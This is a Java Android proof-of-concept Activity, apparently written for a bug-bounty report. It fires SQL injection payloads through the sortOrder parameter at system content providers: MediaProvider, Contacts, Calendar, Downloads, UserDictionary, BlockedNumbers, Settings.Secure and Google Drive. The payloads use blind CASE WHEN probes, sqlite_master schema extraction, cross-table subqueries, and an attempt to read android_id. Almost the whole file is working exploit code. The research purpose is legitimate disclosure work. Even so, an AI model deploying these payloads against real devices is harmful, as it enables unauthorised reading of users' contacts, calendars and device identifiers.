package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SortOrderSqliActivity extends Activity {
    private static final String TAG = "SortOrderSqli";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("SortOrder SQL Injection PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testMediaProviderSortOrder();
        testContactsSortOrder();
        testCalendarSortOrder();
        testDownloadSortOrder();
        testUserDictSortOrder();
        testBlockedNumbersSortOrder();
        testSettingsProviderSortOrder();
        testDocumentsProviderSortOrder();
        log("\n=== ALL SORT ORDER TESTS COMPLETE ===");
    }

    private void testMediaProviderSortOrder() {
        log("=== TEST 1: MediaProvider sortOrder injection ===");

        // Basic CASE WHEN in sortOrder
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://media/external/images/media"),
                new String[]{"_id", "_display_name"},
                null, null,
                "CASE WHEN (SELECT count(*) FROM sqlite_master)>0 THEN _id ELSE _id END"
            );
            if (c != null) {
                log("[VULN] MediaProvider CASE WHEN sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("MediaProvider sort: " + shorten(e.getMessage(), 100));
        }

        // Subquery in sortOrder
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://media/external/images/media"),
                new String[]{"_id"},
                null, null,
                "(SELECT count(*) FROM sqlite_master)"
            );
            if (c != null) {
                log("[VULN] MediaProvider subquery sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("MediaProvider subquery sort: " + shorten(e.getMessage(), 100));
        }
    }

    private void testContactsSortOrder() {
        log("\n=== TEST 2: ContactsProvider sortOrder injection ===");

        // CASE WHEN blind boolean
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id", "display_name"},
                null, null,
                "CASE WHEN (SELECT count(*) FROM sqlite_master WHERE type='table')>5 THEN display_name ELSE _id END"
            );
            if (c != null) {
                log("[VULN] Contacts CASE WHEN sort: " + c.getCount() + " rows");
                // Check if sorting changed (indicates CASE WHEN executed)
                if (c.moveToFirst()) {
                    String name1 = c.getString(1);
                    log("  First contact: " + name1);
                }
                c.close();
            }
        } catch (Exception e) {
            log("Contacts sort: " + shorten(e.getMessage(), 100));
        }

        // Schema extraction via sortOrder
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"_id"},
                null, null,
                "(SELECT group_concat(name,',') FROM sqlite_master WHERE type='table') ASC"
            );
            if (c != null) {
                log("[VULN] Contacts schema sort executed: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Contacts schema sort: " + shorten(e.getMessage(), 100));
        }
    }

    private void testCalendarSortOrder() {
        log("\n=== TEST 3: CalendarProvider sortOrder injection ===");

        // Subquery in sortOrder — extract data via CASE-based blind boolean
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/events"),
                new String[]{"_id", "title"},
                null, null,
                "CASE WHEN (SELECT count(*) FROM Attendees)>0 THEN title ELSE _id END"
            );
            if (c != null) {
                log("[VULN] Calendar CASE WHEN sort (Attendees): " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Calendar sort: " + shorten(e.getMessage(), 100));
        }

        // Cross-table access via sortOrder
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/calendars"),
                new String[]{"_id", "name"},
                null, null,
                "(SELECT count(*) FROM Events)"
            );
            if (c != null) {
                log("[VULN] Calendar cross-table sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Calendar cross-table sort: " + shorten(e.getMessage(), 100));
        }
    }

    private void testDownloadSortOrder() {
        log("\n=== TEST 4: DownloadProvider sortOrder injection ===");

        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://downloads/my_downloads"),
                new String[]{"_id"},
                null, null,
                "CASE WHEN (SELECT 1)=1 THEN _id END"
            );
            if (c != null) {
                log("[VULN] Downloads CASE WHEN sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Downloads sort: " + shorten(e.getMessage(), 100));
        }
    }

    private void testUserDictSortOrder() {
        log("\n=== TEST 5: UserDictionary sortOrder injection ===");

        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://user_dictionary/words"),
                new String[]{"_id", "word"},
                null, null,
                "CASE WHEN (SELECT count(*) FROM sqlite_master)>0 THEN word ELSE _id END"
            );
            if (c != null) {
                log("[VULN] UserDict CASE WHEN sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("UserDict sort: " + shorten(e.getMessage(), 100));
        }
    }

    private void testBlockedNumbersSortOrder() {
        log("\n=== TEST 6: BlockedNumbers sortOrder injection ===");

        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.blockednumber/blocked"),
                new String[]{"_id"},
                null, null,
                "CASE WHEN 1=1 THEN _id END"
            );
            if (c != null) {
                log("[VULN] BlockedNumbers sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("BlockedNumbers sort: " + shorten(e.getMessage(), 100));
        }
    }

    private void testSettingsProviderSortOrder() {
        log("\n=== TEST 7: Settings Provider sortOrder injection ===");

        // Settings.System
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://settings/system"),
                new String[]{"name", "value"},
                null, null,
                "CASE WHEN (SELECT count(*) FROM system)>0 THEN name ELSE value END"
            );
            if (c != null) {
                log("[VULN] Settings.System CASE WHEN sort: " + c.getCount() + " rows");
                if (c.moveToFirst()) {
                    log("  First setting: " + c.getString(0) + "=" + shorten(c.getString(1), 40));
                }
                c.close();
            }
        } catch (Exception e) {
            log("Settings sort: " + shorten(e.getMessage(), 100));
        }

        // Settings.Secure — more sensitive
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://settings/secure"),
                new String[]{"name", "value"},
                null, null,
                "CASE WHEN (SELECT count(*) FROM secure WHERE name='android_id')>0 THEN name END"
            );
            if (c != null) {
                log("[VULN] Settings.Secure CASE WHEN sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Settings.Secure sort: " + shorten(e.getMessage(), 100));
        }

        // Try to read android_id via sortOrder
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://settings/secure"),
                new String[]{"name", "value"},
                "name=?",
                new String[]{"android_id"},
                null
            );
            if (c != null && c.moveToFirst()) {
                log("[INFO] android_id: " + c.getString(1));
                c.close();
            }
        } catch (Exception e) {
            log("android_id: " + shorten(e.getMessage(), 80));
        }
    }

    private void testDocumentsProviderSortOrder() {
        log("\n=== TEST 8: DocumentsProvider sortOrder injection ===");

        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.externalstorage.documents/root"),
                null, null, null,
                "CASE WHEN 1=1 THEN root_id END"
            );
            if (c != null) {
                log("[VULN] ExternalStorage CASE WHEN sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("ExternalStorage sort: " + shorten(e.getMessage(), 100));
        }

        // Google Drive DocumentsProvider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.google.android.apps.docs.storage/root"),
                null, null, null,
                "CASE WHEN 1=1 THEN root_id END"
            );
            if (c != null) {
                log("[VULN] GoogleDrive CASE WHEN sort: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("GoogleDrive sort: " + shorten(e.getMessage(), 100));
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
